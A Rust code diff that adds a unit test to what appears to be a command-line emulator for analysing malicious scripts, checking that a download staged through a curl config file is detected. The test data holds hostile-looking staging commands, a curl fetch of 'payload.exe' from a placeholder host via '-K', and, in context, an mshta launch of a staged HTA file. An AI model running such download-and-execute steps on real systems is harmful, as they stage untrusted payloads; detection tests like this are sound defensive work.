@@ -12281,7 +12281,7 @@ mod powershell_tests {
 
 #[cfg(test)]
 mod curl_tests {
-    use crate::env::{Config, Environment};
+    use crate::env::{Config, Environment, FsEntry};
     use crate::interp::interpret_line;
     use crate::traits::Trait;
 
@@ -12837,6 +12837,37 @@ mshta C:/Temp/stage.hta"#,
             vec![("https://curl-url.example/payload.bin", Some("out.bin"))],
             "traits: {:?}",
             env.traits
+        );
+    }
+
+    #[test]
+    fn curl_config_file_reads_tracked_url_and_output() {
+        let mut env = Environment::new(&Config::default());
+        interpret_line(
+            r#"echo url = "https://curl-config-file.example/payload.exe">curl.cfg"#,
+            &mut env,
+        );
+        interpret_line(r#"echo output = "payload.exe">>curl.cfg"#, &mut env);
+        interpret_line("curl -K curl.cfg", &mut env);
+
+        assert!(
+            env.traits.iter().any(|t| matches!(
+                t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-config-file.example/payload.exe"
+                        && dst.as_deref() == Some("payload.exe")
+            )),
+            "curl config file did not emit structured download: {:?}",
+            env.traits
+        );
+        assert!(
+            matches!(
+                env.modified_filesystem.get("payload.exe"),
+                Some(FsEntry::Download { src })
+                    if src == "https://curl-config-file.example/payload.exe"
+            ),
+            "curl config file did not record destination: {:?}",
+            env.modified_filesystem
         );
     }
 }
